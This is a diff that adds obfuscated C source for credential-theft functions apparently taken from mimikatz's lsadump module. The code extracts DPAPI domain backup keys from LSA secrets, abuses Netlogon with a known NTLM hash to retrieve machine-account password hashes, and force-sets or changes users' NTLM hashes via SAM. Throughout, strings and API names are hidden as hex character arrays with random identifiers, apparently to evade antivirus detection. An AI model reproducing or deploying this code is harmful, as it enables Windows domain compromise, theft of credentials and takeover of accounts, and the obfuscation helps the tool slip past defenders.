+			kuhl_m_dpapi_oe_domainkey_add(guid, (PBYTE) secret + sizeof(DWORD), size - sizeof(DWORD), FALSE);
+			kull_m_string_wprintf_hex((PBYTE) secret + sizeof(DWORD), size - sizeof(DWORD), (32 << 16));
+			kprintf(L"\n");
+			if(isExport)
+			{
+				filename = kuhl_m_crypto_generateFileName(hid_n_t_d__IWwnrw51pJBg, hid_l_e_g__bBztHPdnp1dI, 0, shortname, hid_k_e_y__qMjxcnNOpcxk);
+				data = (PBYTE) secret + sizeof(DWORD);
+				len = size - sizeof(DWORD);
+			}
+			break;
+		default:
+			kprintf(hid________eHLPT3ahuFTx, secret->version);
+			kull_m_string_wprintf_hex(secret, size, (32 << 16));
+			kprintf(L"\n");
+			if(isExport)
+			{
+				filename = kuhl_m_crypto_generateFileName(hid_n_t_d__QSU1erLNZG6e, hid_u_n_k__Vtoc0IUb8V9E, 0, shortname, hid_k_e_y__yERMf1Pawj1L);
+				data = secret;
+				len = size;
+			}
+		}
+		if(filename)
+		{
+			if(data && len)
+				kprintf(hid___E_x__LO3L79nfPCi8, kull_m_file_writeData(filename, data, len) ? L"OK" : L"KO", filename);
+			LocalFree(filename);
+		}
+		RtlFreeUnicodeString(&uString);
+	}
+}
+
+NTSTATUS kuhl_m_lsadump_getKeyFromGUID(LPCGUID guid, BOOL isExport, LPCWSTR systemName, BOOL isSecret)
+{
+	
+	const wchar_t  hid_G___B__rPWYO0D8L5Kd[] = {'\x47','\x24','\x42','\x43','\x4b','\x55','\x50','\x4b','\x45','\x59','\x5f',0};
+NTSTATUS status = STATUS_UNSUCCESSFUL;
+	UNICODE_STRING secret;
+	keyName = (wchar_t [49] )hid_G___B__rPWYO0D8L5Kd;
+	keyName[48] = L'\0';
+
+	if(NT_SUCCESS(RtlStringFromGUID(guid, &secret)))
+	{
+		RtlCopyMemory(keyName + 11, secret.Buffer + 1, 36 * sizeof(wchar_t));
+		RtlFreeUnicodeString(&secret);
+		
+		status = kuhl_m_lsadump_LsaRetrievePrivateData(systemName, keyName, &secret, isSecret);
+		if(NT_SUCCESS(status))
+		{
+			kuhl_m_lsadump_analyzeKey(guid, (PKIWI_BACKUP_KEY) secret.Buffer, secret.Length, isExport);
+			LocalFree(secret.Buffer);
+		}
+		else PRINT_ERROR(L"kuhl_m_lsadump_LsaRetrievePrivateData: 0x%08x\n", status);
+	}
+	return status;
+}
+
+NTSTATUS kuhl_m_lsadump_bkey(int argc, wchar_t * argv[])
+{
+	
+	 wchar_t  hid___s_e__Bz6Vc5IHnNwM[] = {'\x20','\x73','\x65','\x65','\x6d','\x73','\x20','\x74','\x6f','\x20','\x62','\x65','\x20','\x61','\x20','\x76','\x61','\x6c','\x69','\x64','\x20','\x47','\x55','\x49','\x44','\n',0};
+
+	 wchar_t  hid___C_u__UJfUMP1rsXaX[] = {'\n','\x43','\x75','\x72','\x72','\x65','\x6e','\x74','\x20','\x70','\x72','\x65','\x66','\x65','\x72','\x65','\x64','\x20','\x6b','\x65','\x79','\x3a','\x20','\x20','\x20','\x20','\x20','\x20','\x20',0};
+
+	 wchar_t  hid_G___B__UxR0iGBC4sq3[] = {'\x47','\x24','\x42','\x43','\x4b','\x55','\x50','\x4b','\x45','\x59','\x5f','\x50','\x52','\x45','\x46','\x45','\x52','\x52','\x45','\x44',0};
+
+	 wchar_t  hid___C_o__lm5oqmB6SgLl[] = {'\n','\x43','\x6f','\x6d','\x70','\x61','\x74','\x69','\x62','\x69','\x6c','\x69','\x74','\x79','\x20','\x70','\x72','\x65','\x66','\x65','\x72','\x65','\x64','\x20','\x6b','\x65','\x79','\x3a','\x20',0};
+
+	 wchar_t  hid_G___B__32zP1nI8v9hw[] = {'\x47','\x24','\x42','\x43','\x4b','\x55','\x50','\x4b','\x45','\x59','\x5f','\x50',0};
+NTSTATUS status;
+	UNICODE_STRING secret;
+	GUID guid;
+	PCWCHAR szGuid = NULL, szSystem = NULL;
+	BOOL export = kull_m_string_args_byName(argc, argv, L"export", NULL, NULL);
+	BOOL isSecret = kull_m_string_args_byName(argc, argv, L"secret", NULL, NULL);
+
+	kull_m_string_args_byName(argc, argv, L"system", &szSystem, NULL);
+	kull_m_string_args_byName(argc, argv, L"guid", &szGuid, NULL);
+	if(szGuid)
+	{
+		RtlInitUnicodeString(&secret, szGuid);
+		status = RtlGUIDFromString(&secret, &guid);
+		if(NT_SUCCESS(status))
+		{
+			kprintf(L"\n"); kull_m_string_displayGUID(&guid); kprintf(hid___s_e__Bz6Vc5IHnNwM);
+			kuhl_m_lsadump_getKeyFromGUID(&guid, export, szSystem, isSecret);
+		}
+		else PRINT_ERROR(L"Invalid GUID (0x%08x) ; %s\n", status, szGuid);
+	}
+	else
+	{
+		kprintf(hid___C_u__UJfUMP1rsXaX);
+		status = kuhl_m_lsadump_LsaRetrievePrivateData(szSystem, hid_G___B__UxR0iGBC4sq3, &secret, isSecret);
+		if(NT_SUCCESS(status))
+		{
+			kull_m_string_displayGUID((LPCGUID) secret.Buffer); kprintf(L"\n");
+			kuhl_m_lsadump_getKeyFromGUID((LPCGUID) secret.Buffer, export, szSystem, isSecret);
+			LocalFree(secret.Buffer);
+		}
+		else PRINT_ERROR(L"kuhl_m_lsadump_LsaRetrievePrivateData: 0x%08x\n", status);
+
+		kprintf(hid___C_o__lm5oqmB6SgLl);
+		status = kuhl_m_lsadump_LsaRetrievePrivateData(szSystem, hid_G___B__32zP1nI8v9hw, &secret, isSecret);
+		if(NT_SUCCESS(status))
+		{
+			kull_m_string_displayGUID((LPCGUID) secret.Buffer); kprintf(L"\n");
+			kuhl_m_lsadump_getKeyFromGUID((LPCGUID) secret.Buffer, export, szSystem, isSecret);
+			LocalFree(secret.Buffer);
+		}
+		else PRINT_ERROR(L"kuhl_m_lsadump_LsaRetrievePrivateData: 0x%08x\n", status);
+	}
+	return STATUS_SUCCESS;
+}
+
+NTSTATUS kuhl_m_lsadump_rpdata(int argc, wchar_t * argv[])
+{
+	NTSTATUS status;
+	UNICODE_STRING secret;
+	LPCWSTR szName, szSystem = NULL;
+	BOOL export = kull_m_string_args_byName(argc, argv, L"export", NULL, NULL); // todo
+	BOOL isSecret = kull_m_string_args_byName(argc, argv, L"secret", NULL, NULL);
+	if(kull_m_string_args_byName(argc, argv, L"name", &szName, NULL))
+	{
+		kull_m_string_args_byName(argc, argv, L"system", &szSystem, NULL);
+		status = kuhl_m_lsadump_LsaRetrievePrivateData(szSystem, szName, &secret, isSecret);
+		if(NT_SUCCESS(status))
+		{
+			kull_m_string_wprintf_hex(secret.Buffer, secret.Length, 1 | (16<<16));
+			LocalFree(secret.Buffer);
+		}
+		else PRINT_ERROR(L"kuhl_m_lsadump_LsaRetrievePrivateData: 0x%08x\n", status);
+	}
+	return STATUS_SUCCESS;
+}
+
+NETLOGON_SECURE_CHANNEL_TYPE kuhl_m_lsadump_netsync_sc[] = {WorkstationSecureChannel, ServerSecureChannel, TrustedDnsDomainSecureChannel, CdcServerSecureChannel};
+NTSTATUS kuhl_m_lsadump_netsync(int argc, wchar_t * argv[])
+{
+	
+	 wchar_t  hid_____A__SOplSLZxCxzf[] = {'\x20','\x20','\x41','\x63','\x63','\x6f','\x75','\x6e','\x74','\x3a','\x20','\x25','\x73','\n',0};
+
+	 wchar_t  hid_____N__4ijHR9gDHWmX[] = {'\x20','\x20','\x4e','\x54','\x4c','\x4d','\x20','\x20','\x20','\x3a','\x20',0};
+
+	 wchar_t  hid_____N__ay5r39la6wyU[] = {'\x20','\x20','\x4e','\x54','\x4c','\x4d','\x2d','\x31','\x20','\x3a','\x20',0};
+NTSTATUS status;
+	NETLOGON_CREDENTIAL ClientChallenge = {'-', '\\', '|', '/', '-', '\\', '|', '/'}, ServerChallenge, CandidateServerCredential, ClientCredential, ServerCredential;
+	NETLOGON_AUTHENTICATOR ClientAuthenticator, ServerAuthenticator;
+	BYTE ntlmHash[LM_NTLM_HASH_LENGTH], sessionKey[MD5_DIGEST_LENGTH];
+	DWORD i = 0, NegotiateFlags = 0x600FFFFF;
+	MD5_CTX ctx;
+	ENCRYPTED_NT_OWF_PASSWORD EncryptedNewOwfPassword, EncryptedOldOwfPassword;
+	NT_OWF_PASSWORD NewOwfPassword, OldOwfPassword;
+	PCWCHAR szDc, szComputer, szUser, szNtlm, szAccount;
+
+	if(kull_m_string_args_byName(argc, argv, L"dc", &szDc, NULL))
+	{
+		if(kull_m_string_args_byName(argc, argv, L"user", &szUser, NULL))
+		{
+			kull_m_string_args_byName(argc, argv, L"account", &szAccount, szUser);
+			kull_m_string_args_byName(argc, argv, L"computer", &szComputer, MIMIKATZ);
+			if(kull_m_string_args_byName(argc, argv, L"ntlm", &szNtlm, NULL))
+			{
+				if(kull_m_string_stringToHex(szNtlm, ntlmHash, sizeof(ntlmHash)))
+				{
+					//kprintf(L"> ClientChallenge          : "); kull_m_string_wprintf_hex(ClientChallenge.data, sizeof(ClientChallenge.data), 0); kprintf(L"\n");
+					status = I_NetServerReqChallenge((LOGONSRV_HANDLE) szDc, (wchar_t *) szComputer, &ClientChallenge, &ServerChallenge);
+					if(NT_SUCCESS(status))
+					{
+						//kprintf(L"< ServerChallenge          : "); kull_m_string_wprintf_hex(ServerChallenge.data, sizeof(ServerChallenge.data), 0); kprintf(L"\n");
+						MD5Init(&ctx);
+						MD5Update(&ctx, &i, sizeof(i));
+						MD5Update(&ctx, ClientChallenge.data, sizeof(ClientChallenge.data));
+						MD5Update(&ctx, ServerChallenge.data, sizeof(ServerChallenge.data));
+						MD5Final(&ctx);
+						if(kull_m_crypto_hmac(CALG_MD5, ntlmHash, sizeof(ntlmHash), ctx.digest, sizeof(ctx.digest), sessionKey, sizeof(sessionKey)))
+						{
+							//kprintf(L"> Session Key              : "); kull_m_string_wprintf_hex(sessionKey, sizeof(sessionKey), 0); kprintf(L"\n");
+							kuhl_m_lsadump_netsync_NlComputeCredentials((PBYTE) ClientChallenge.data, (PBYTE) ClientCredential.data, sessionKey);
+							kuhl_m_lsadump_netsync_NlComputeCredentials((PBYTE) ServerChallenge.data, (PBYTE) CandidateServerCredential.data, sessionKey);
+							//kprintf(L"> ClientCredential         : "); kull_m_string_wprintf_hex(ClientCredential.data, sizeof(ClientCredential.data), 0); kprintf(L"\n");
+							//kprintf(L"> CandidateServerCredential: "); kull_m_string_wprintf_hex(CandidateServerCredential.data, sizeof(CandidateServerCredential.data), 0); kprintf(L"\n");
+							//kprintf(L"> NegotiateFlags           : 0x%08x\n", NegotiateFlags);
+							status = I_NetServerAuthenticate2((LOGONSRV_HANDLE) szDc, (wchar_t *) szUser, ServerSecureChannel, (wchar_t *) szComputer, &ClientCredential, &ServerCredential, &NegotiateFlags);
+							if(NT_SUCCESS(status))
+							{
+								//kprintf(L"< ServerCredential         : "); kull_m_string_wprintf_hex(ServerCredential.data, sizeof(ServerCredential.data), 0); kprintf(L"\n");
+								if(RtlEqualMemory(CandidateServerCredential.data, ServerCredential.data, sizeof(CandidateServerCredential.data)))
+								{
+									//kprintf(L"< NegotiateFlags           : 0x%08x\n", NegotiateFlags);
+									for(status = STATUS_NO_SUCH_USER, i = 0; (status == STATUS_NO_SUCH_USER) && (i < ARRAYSIZE(kuhl_m_lsadump_netsync_sc)); i++)
+									{
+										kuhl_m_lsadump_netsync_AddTimeStampForAuthenticator(&ClientCredential, 0x10, &ClientAuthenticator, sessionKey);
+										//kprintf(L"> ClientAuthenticator (%u)  : ", kuhl_m_lsadump_netsync_sc[i]); kull_m_string_wprintf_hex(ClientAuthenticator.Credential.data, sizeof(ClientAuthenticator.Credential.data), 0); kprintf(L" (%u - 0x%08x)\n", ClientAuthenticator.Timestamp, ClientAuthenticator.Timestamp);
+										status = I_NetServerTrustPasswordsGet((LOGONSRV_HANDLE) szDc, (wchar_t *) szAccount, kuhl_m_lsadump_netsync_sc[i], (wchar_t *) szComputer, &ClientAuthenticator, &ServerAuthenticator, &EncryptedNewOwfPassword, &EncryptedOldOwfPassword);
+										if(NT_SUCCESS(status))
+										{
+											kprintf(hid_____A__SOplSLZxCxzf, szAccount);
+											RtlDecryptDES2blocks2keys((LPCBYTE) &EncryptedNewOwfPassword, sessionKey, (LPBYTE) &NewOwfPassword);
+											RtlDecryptDES2blocks2keys((LPCBYTE) &EncryptedOldOwfPassword, sessionKey, (LPBYTE) &OldOwfPassword);
+											kprintf(hid_____N__4ijHR9gDHWmX); kull_m_string_wprintf_hex(&NewOwfPassword, LM_NTLM_HASH_LENGTH, 0); kprintf(L"\n");
+											kprintf(hid_____N__ay5r39la6wyU); kull_m_string_wprintf_hex(&OldOwfPassword, LM_NTLM_HASH_LENGTH, 0); kprintf(L"\n");
+										}
+										*(PDWORD64) ClientCredential.data += 1; // lol :) validate server auth
+									}
+									if(!NT_SUCCESS(status))
+										PRINT_ERROR(L"I_NetServerTrustPasswordsGet (0x%08x)\n", status);
+								}
+								else PRINT_ERROR(L"ServerCredential does not match CandidateServerCredential\n");
+							}
+							else PRINT_ERROR(L"I_NetServerAuthenticate2 (0x%08x)\n", status);
+						}
+					}
+					else PRINT_ERROR(L"I_NetServerReqChallenge (0x%08x)\n", status);
+				}
+				else PRINT_ERROR(L"ntlm hash/rc4 key length must be 32 (16 bytes)\n");
+			}
+			else PRINT_ERROR(L"Missing argument : ntlm\n");
+		}
+		else PRINT_ERROR(L"Missing argument : user\n");
+	}
+	else PRINT_ERROR(L"Missing argument : dc\n");
+	return STATUS_SUCCESS;
+}
+
+NTSTATUS kuhl_m_lsadump_netsync_NlComputeCredentials(PBYTE input, PBYTE output, PBYTE key) // Q&D
+{
+  BYTE bufferData[DES_BLOCK_LENGTH];
+  RtlZeroMemory(output, DES_BLOCK_LENGTH);
+  RtlEncryptDES1block1key(input, key, bufferData);
+  return RtlEncryptDES1block1key(bufferData, key + DES_KEY_LENGTH, output);
+}
+
+void kuhl_m_lsadump_netsync_AddTimeStampForAuthenticator(PNETLOGON_CREDENTIAL Credential, DWORD TimeStamp, PNETLOGON_AUTHENTICATOR Authenticator, BYTE sessionKey[MD5_DIGEST_LENGTH])
+{
+	Authenticator->Timestamp = TimeStamp;
+	*(PDWORD64) (Credential->data) += TimeStamp;
+	kuhl_m_lsadump_netsync_NlComputeCredentials((PBYTE) Credential->data, (PBYTE) Authenticator->Credential.data, sessionKey);
+}
+
+/*	This function `setntlm` is based on the idea of
+	Vincent LE TOUX ( vincent.letoux@gmail.com / http://www.mysmartlogon.com )
+	yes, again him... he loves LSA too ;)
+*/
+NTSTATUS CALLBACK kuhl_m_lsadump_setntlm_callback(SAMPR_HANDLE hUser, PVOID pvArg)
+{
+	
+	 wchar_t  hid________qjIzu0faLifC[] = {'\n','\x3e','\x3e','\x20','\x49','\x6e','\x66','\x6f','\x72','\x6d','\x61','\x74','\x69','\x6f','\x6e','\x73','\x20','\x61','\x72','\x65','\x20','\x69','\x6e','\x20','\x74','\x68','\x65','\x20','\x74','\x61','\x72','\x67','\x65','\x74','\x20','\x53','\x41','\x4d','\x21','\n',0};
+	typedef NTSTATUS(__stdcall* _SamSetInformationUser)(SAMPR_HANDLE UserHandle, USER_INFORMATION_CLASS UserInformationClass, PSAMPR_USER_INFO_BUFFER Buffer);
+	TCHAR hid_samlib_2MPyPo3C1PAX[] = {'\x73','\x61','\x6d','\x6c','\x69','\x62','\x2e','\x64','\x6c','\x6c',0};
+
+	HANDLE hid_hHandl_GNlZBCi2Is7v = LoadLibrary(hid_samlib_2MPyPo3C1PAX);
+	TCHAR hid_SamSet_5JL58DmVcP48[] = {'\x53','\x61','\x6d','\x53','\x65','\x74','\x49','\x6e','\x66','\x6f','\x72','\x6d','\x61','\x74','\x69','\x6f','\x6e','\x55','\x73','\x65','\x72',0};
+
+	_SamSetInformationUser hid_SamSet_AQmVKOp7t8BW = (_SamSetInformationUser) GetProcAddress(hid_hHandl_GNlZBCi2Is7v, hid_SamSet_5JL58DmVcP48);
+NTSTATUS status = hid_SamSet_AQmVKOp7t8BW(hUser, UserInternal1Information, (PSAMPR_USER_INFO_BUFFER) pvArg);
+	if(NT_SUCCESS(status))
+		kprintf(hid________qjIzu0faLifC);
+	else PRINT_ERROR(L"SamSetInformationUser: %08x\n", status);
+	return status;
+}
+
+NTSTATUS kuhl_m_lsadump_setntlm(int argc, wchar_t * argv[])
+{
+	
+	 wchar_t  hid________8c1nhnHFNz2J[] = {'\x2a','\x2a','\x20','\x4e','\x6f','\x20','\x63','\x72','\x65','\x64','\x65','\x6e','\x74','\x69','\x61','\x6c','\x73','\x20','\x70','\x72','\x6f','\x76','\x69','\x64','\x65','\x64','\x2c','\x20','\x77','\x69','\x6c','\x6c','\x20','\x75','\x73','\x65','\x20','\x74','\x68','\x65','\x20','\x64','\x65','\x66','\x61','\x75','\x6c','\x74','\x20','\x6f','\x6e','\x65','\x20','\x2a','\x2a','\n',0};
+
+	 wchar_t  hid_N_T_L__llLmp6NyxMas[] = {'\x4e','\x54','\x4c','\x4d','\x20','\x20','\x20','\x20','\x20','\x20','\x20','\x20','\x20','\x3a','\x20',0};
+NTSTATUS status;
+	LSA_UNICODE_STRING password;
+	PCWCHAR szPassword;
+	SAMPR_USER_INFO_BUFFER infos = {{{0x60, 0xba, 0x4f, 0xca, 0xdc, 0x46, 0x6c, 0x7a, 0x03, 0x3c, 0x17, 0x81, 0x94, 0xc0, 0x3d, 0xf6}, {0x7c, 0x1c, 0x15, 0xe8, 0x74, 0x11, 0xfb, 0xa2, 0x1d, 0x91, 0xa0, 0x81, 0xd4, 0xb3, 0x78, 0x61}, TRUE, FALSE, FALSE, FALSE,}};
+
+	if(kull_m_string_args_byName(argc, argv, L"password", &szPassword, NULL))
+	{
+		RtlInitUnicodeString(&password, szPassword);
+		status = RtlDigestNTLM(&password, infos.Internal1.NTHash);
+		if(!NT_SUCCESS(status))
+			PRINT_ERROR(L"Unable to digest NTLM hash from password: %08x\n", status);
+	}
+	else if(kull_m_string_args_byName(argc, argv, L"ntlm", &szPassword, NULL))
+	{
+		status = kull_m_string_stringToHex(szPassword, infos.Internal1.NTHash, sizeof(infos.Internal1.NTHash)) ? STATUS_SUCCESS : STATUS_WRONG_PASSWORD;
+		if(!NT_SUCCESS(status))
+			PRINT_ERROR(L"Unable to convert \'%s\' to NTLM hash (16 bytes)\n", szPassword);
+	}
+	else
+	{
+		kprintf(hid________8c1nhnHFNz2J);
+		infos.Internal1.LmPasswordPresent = TRUE;
+		status = STATUS_SUCCESS;
+	}
+
+	if(NT_SUCCESS(status))
+	{
+		kprintf(hid_N_T_L__llLmp6NyxMas);
+		kull_m_string_wprintf_hex(infos.Internal1.NTHash, sizeof(infos.Internal1.NTHash), 0);
+		kprintf(L"\n\n");
+		status = kuhl_m_lsadump_enumdomains_users(argc, argv, USER_FORCE_PASSWORD_CHANGE, kuhl_m_lsadump_setntlm_callback, &infos);
+	}
+	return STATUS_SUCCESS;
+}
+
+/*	This function `changentlm` is based on another crazy idea of
+	Vincent LE TOUX ( vincent.letoux@gmail.com / http://www.mysmartlogon.com )
+*/
+NTSTATUS CALLBACK kuhl_m_lsadump_changentlm_callback(SAMPR_HANDLE hUser, PVOID pvArg)
+{
+	
+	 wchar_t  hid________OJax2sf6InYS[] = {'\n','\x3e','\x3e','\x20','\x43','\x68','\x61','\x6e','\x67','\x65','\x20','\x70','\x61','\x73','\x73','\x77','\x6f','\x72','\x64','\x20','\x69','\x73','\x20','\x61','\x20','\x73','\x75','\x63','\x63','\x65','\x73','\x73','\x21','\n',0};
+	typedef NTSTATUS(__stdcall* _SamiChangePasswordUser)(SAMPR_HANDLE UserHandle, BOOL isOldLM, const BYTE oldLM[LM_NTLM_HASH_LENGTH], const BYTE newLM[LM_NTLM_HASH_LENGTH], BOOL isNewNTLM, const BYTE oldNTLM[LM_NTLM_HASH_LENGTH], const BYTE newNTLM[LM_NTLM_HASH_LENGTH]);
+	TCHAR hid_samlib_cR3P6GmkQk6n[] = {'\x73','\x61','\x6d','\x6c','\x69','\x62','\x2e','\x64','\x6c','\x6c',0};
+
+	HANDLE hid_hHandl_zU16hRyz46lz = LoadLibrary(hid_samlib_cR3P6GmkQk6n);
+	TCHAR hid_SamiCh_vNHJ1zCNDWxp[] = {'\x53','\x61','\x6d','\x69','\x43','\x68','\x61','\x6e','\x67','\x65','\x50','\x61','\x73','\x73','\x77','\x6f','\x72','\x64','\x55','\x73','\x65','\x72',0};
+
+	_SamiChangePasswordUser hid_SamiCh_zCwTiTIRQaBt = (_SamiChangePasswordUser) GetProcAddress(hid_hHandl_zU16hRyz46lz, hid_SamiCh_vNHJ1zCNDWxp);
+PKUHL_M_LSADUMP_CHANGENTLM_DATA data = (PKUHL_M_LSADUMP_CHANGENTLM_DATA) pvArg;
+	NTSTATUS status = hid_SamiCh_zCwTiTIRQaBt(hUser, data->isOldLM, data->oldLM, data->newLM, data->isNewNTLM, data->oldNTLM, data->newNTLM);
+	if(NT_SUCCESS(status))
+		kprintf(hid________OJax2sf6InYS);
+	else if(status == STATUS_WRONG_PASSWORD)
+		PRINT_ERROR(L"Bad old NTLM hash or password!\n");
+	else if(status == STATUS_PASSWORD_RESTRICTION)
+		PRINT_ERROR(L"Bad new NTLM hash or password! (restriction)\n");
+	else PRINT_ERROR(L"SamiChangePasswordUser: %08x\n", status);
+	return status;
+}
+
+NTSTATUS kuhl_m_lsadump_changentlm(int argc, wchar_t * argv[])
+{
+	
+	 wchar_t  hid________p9SThso46g9c[] = {'\x2a','\x2a','\x20','\x4e','\x6f','\x20','\x6e','\x65','\x77','\x20','\x63','\x72','\x65','\x64','\x65','\x6e','\x74','\x69','\x61','\x6c','\x73','\x20','\x70','\x72','\x6f','\x76','\x69','\x64','\x65','\x64','\x2c','\x20','\x77','\x69','\x6c','\x6c','\x20','\x75','\x73','\x65','\x20','\x74','\x68','\x65','\x20','\x64','\x65','\x66','\x61','\x75','\x6c','\x74','\x20','\x6f','\x6e','\x65','\x20','\x2a','\x2a','\n',0};
+
+	 wchar_t  hid_O_L_D__6pdFeybUewDs[] = {'\x4f','\x4c','\x44','\x20','\x4e','\x54','\x4c','\x4d','\x20','\x20','\x20','\x20','\x20','\x3a','\x20',0};
+
+	 wchar_t  hid___N_E__5lYnenQornkw[] = {'\n','\x4e','\x45','\x57','\x20','\x4e','\x54','\x4c','\x4d','\x20','\x20','\x20','\x20','\x20','\x3a','\x20',0};
+NTSTATUS status0 = STATUS_DATA_ERROR, status1 = STATUS_DATA_ERROR;
+	LSA_UNICODE_STRING password;
+	PCWCHAR szPassword;
+	KUHL_M_LSADUMP_CHANGENTLM_DATA infos = {FALSE, {0}, {0}, TRUE, {0}, {0x60, 0xba, 0x4f, 0xca, 0xdc, 0x46, 0x6c, 0x7a, 0x03, 0x3c, 0x17, 0x81, 0x94, 0xc0, 0x3d, 0xf6}};
+
+	if(kull_m_string_args_byName(argc, argv, L"oldpassword", &szPassword, NULL))
+	{
+		RtlInitUnicodeString(&password, szPassword);
+		status0 = RtlDigestNTLM(&password, infos.oldNTLM);
+		if(!NT_SUCCESS(status0))
+			PRINT_ERROR(L"Unable to digest NTLM hash from old password: %08x\n", status0);
+	}
+	else if(kull_m_string_args_byName(argc, argv, L"oldntlm", &szPassword, NULL) || kull_m_string_args_byName(argc, argv, L"old", &szPassword, NULL))
+	{
+		status0 = kull_m_string_stringToHex(szPassword, infos.oldNTLM, sizeof(infos.oldNTLM)) ? STATUS_SUCCESS : STATUS_WRONG_PASSWORD;
+		if(!NT_SUCCESS(status0))
+			PRINT_ERROR(L"Unable to convert \'%s\' to old NTLM hash (16 bytes)\n", szPassword);
+	}
+	else PRINT_ERROR(L"Argument /oldpassword: or /oldntlm: is needed\n");
+
+	if(kull_m_string_args_byName(argc, argv, L"newpassword", &szPassword, NULL))
+	{
+		RtlInitUnicodeString(&password, szPassword);
+		status1 = RtlDigestNTLM(&password, infos.newNTLM);
+		if(!NT_SUCCESS(status1))
+			PRINT_ERROR(L"Unable to digest NTLM hash from new password: %08x\n", status1);
+	}
+	else if(kull_m_string_args_byName(argc, argv, L"newntlm", &szPassword, NULL) || kull_m_string_args_byName(argc, argv, L"new", &szPassword, NULL))
+	{
+		status1 = kull_m_string_stringToHex(szPassword, infos.newNTLM, sizeof(infos.newNTLM)) ? STATUS_SUCCESS : STATUS_WRONG_PASSWORD;
+		if(!NT_SUCCESS(status1))
+			PRINT_ERROR(L"Unable to convert \'%s\' to new NTLM hash (16 bytes)\n", szPassword);
+	}
+	else
+	{
+		kprintf(hid________p9SThso46g9c);
+		status1 = STATUS_SUCCESS;
+	}
+
+	if(NT_SUCCESS(status0) && NT_SUCCESS(status1))
+	{
+		kprintf(hid_O_L_D__6pdFeybUewDs);
+		kull_m_string_wprintf_hex(infos.oldNTLM, sizeof(infos.oldNTLM), 0);
+		kprintf(hid___N_E__5lYnenQornkw);
+		kull_m_string_wprintf_hex(infos.newNTLM, sizeof(infos.newNTLM), 0);
+		kprintf(L"\n\n");
+		status0 = kuhl_m_lsadump_enumdomains_users(argc, argv, USER_CHANGE_PASSWORD, kuhl_m_lsadump_changentlm_callback, &infos);
+	}
+	return STATUS_SUCCESS;
+}
+
+DECLARE_CONST_UNICODE_STRING(uBuiltin, L"Builtin");
+NTSTATUS kuhl_m_lsadump_enumdomains_users(int argc, wchar_t * argv[], DWORD dwUserAccess, PKUHL_M_LSADUMP_DOMAINUSER callback, PVOID pvArg)
+{
+	
+	 wchar_t  hid_T_a_r__yyAyoxct0pJ4[] = {'\x54','\x61','\x72','\x67','\x65','\x74','\x20','\x73','\x65','\x72','\x76','\x65','\x72','\x3a','\x20','\x25','\x77','\x5a','\n',0};
+
+	 wchar_t  hid_T_a_r__551X48Vwtbiy[] = {'\x54','\x61','\x72','\x67','\x65','\x74','\x20','\x75','\x73','\x65','\x72','\x20','\x20','\x3a','\x20','\x25','\x77','\x5a','\n',0};
+
+	 wchar_t  hid_T_a_r__TfluZtnEnkuj[] = {'\x54','\x61','\x72','\x67','\x65','\x74','\x20','\x52','\x49','\x44','\x20','\x20','\x20','\x3a','\x20','\x25','\x75','\n',0};
+
+	 wchar_t  hid_D_o_m__baaGu9vlkSsQ[] = {'\x44','\x6f','\x6d','\x61','\x69','\x6e','\x20','\x6e','\x61','\x6d','\x65','\x20','\x20','\x3a','\x20','\x25','\x77','\x5a','\n',0};
+
+	 wchar_t  hid_D_o_m__jVasenjCeHH9[] = {'\x44','\x6f','\x6d','\x61','\x69','\x6e','\x20','\x53','\x49','\x44','\x20','\x20','\x20','\x3a','\x20',0};
+
+	 wchar_t  hid_U_s_e__vXrn7y5vqlTN[] = {'\x55','\x73','\x65','\x72','\x20','\x52','\x49','\x44','\x20','\x20','\x20','\x20','\x20','\x3a','\x20','\x25','\x75','\n',0};
+	TCHAR hid_samlib_VvEPgxce6b7e[] = {'\x73','\x61','\x6d','\x6c','\x69','\x62','\x2e','\x64','\x6c','\x6c',0};
+
+	HANDLE hid_hHandl_uC8BNrSneu0I = LoadLibrary(hid_samlib_VvEPgxce6b7e);
+	TCHAR hid_SamClo_BoIpQ8USjLKI[] = {'\x53','\x61','\x6d','\x43','\x6c','\x6f','\x73','\x65','\x48','\x61','\x6e','\x64','\x6c','\x65',0};
+
+	_SamCloseHandle hid_SamClo_2lqxIO97TzyU = (_SamCloseHandle) GetProcAddress(hid_hHandl_uC8BNrSneu0I, hid_SamClo_BoIpQ8USjLKI);
+	TCHAR hid_samlib_Huz9BQ5n8KkI[] = {'\x73','\x61','\x6d','\x6c','\x69','\x62','\x2e','\x64','\x6c','\x6c',0};
+
+	HANDLE hid_hHandl_8caanj92rBxY = LoadLibrary(hid_samlib_Huz9BQ5n8KkI);
+	TCHAR hid_SamClo_vYAh1Rhghk0I[] = {'\x53','\x61','\x6d','\x43','\x6c','\x6f','\x73','\x65','\x48','\x61','\x6e','\x64','\x6c','\x65',0};
+
+	_SamCloseHandle hid_SamClo_fo6ggQbGCEU4 = (_SamCloseHandle) GetProcAddress(hid_hHandl_8caanj92rBxY, hid_SamClo_vYAh1Rhghk0I);
+	TCHAR hid_samlib_7TzQzU1FGWod[] = {'\x73','\x61','\x6d','\x6c','\x69','\x62','\x2e','\x64','\x6c','\x6c',0};
+
+	HANDLE hid_hHandl_KX8dtOwIE6l9 = LoadLibrary(hid_samlib_7TzQzU1FGWod);
+	TCHAR hid_SamClo_lfoiYQFFx7q2[] = {'\x53','\x61','\x6d','\x43','\x6c','\x6f','\x73','\x65','\x48','\x61','\x6e','\x64','\x6c','\x65',0};
+
+	_SamCloseHandle hid_SamClo_2EJVEuFwZfBZ = (_SamCloseHandle) GetProcAddress(hid_hHandl_KX8dtOwIE6l9, hid_SamClo_lfoiYQFFx7q2);
+	TCHAR hid_samlib_ZROotZaPNfQ9[] = {'\x73','\x61','\x6d','\x6c','\x69','\x62','\x2e','\x64','\x6c','\x6c',0};
+
+	HANDLE hid_hHandl_aqj3o0VgAGrN = LoadLibrary(hid_samlib_ZROotZaPNfQ9);
+	TCHAR hid_SamCon_W2hJvfPA6HAo[] = {'\x53','\x61','\x6d','\x43','\x6f','\x6e','\x6e','\x65','\x63','\x74',0};
+
+	_SamConnect hid_SamCon_BHUQgFPdkLFs = (_SamConnect) GetProcAddress(hid_hHandl_aqj3o0VgAGrN, hid_SamCon_W2hJvfPA6HAo);
+	typedef NTSTATUS(__stdcall* _SamConnectWithCreds)(PUNICODE_STRING ServerName, SAMPR_HANDLE * ServerHandle, ACCESS_MASK DesiredAccess, LSA_OBJECT_ATTRIBUTES * ObjectAttributes, RPC_AUTH_IDENTITY_HANDLE AuthIdentity, PWSTR ServerPrincName, ULONG * unk0);
